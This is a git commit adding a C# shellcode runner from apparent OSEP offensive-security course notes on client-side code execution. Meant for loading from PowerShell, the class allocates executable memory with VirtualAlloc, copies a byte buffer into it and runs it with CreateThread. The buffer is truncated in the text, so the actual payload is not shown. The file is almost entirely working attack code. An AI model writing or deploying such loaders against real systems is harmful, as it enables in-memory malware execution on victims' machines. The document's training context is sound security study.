13256dc3dd4cf8ec6af9b69f8f214b7b7f8455a6
NULL <68764921+debiantano@users.noreply.github.com>
2022-02-16 20:48:12 -0500

    Create PowerShell_dllClass.cs

---
+++ OSEP/4_Client_Side_Code_Execution_With_Windows_Script_Hosts/PowerShell_dllClass.cs
@@ -0,0 +1,28 @@
+using System;
+using System.Runtime.InteropServices;
+
+namespace PowerShell_memory
+{
+    public class Class1
+    {
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+        
+        [DllImport("kernel32.dll")]
+        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+        [DllImport("kernel32.dll")]
+        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+        
+        public static void runner()
+        {
+            byte[] buf = new byte[693] {
+            0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00, ... };
+
+            int size = buf.Length;
+            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
+            Marshal.Copy(buf, 0, addr, size);
+            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+            WaitForSingleObject(hThread, 0xFFFFFFFF);
+        }
+    }
+}
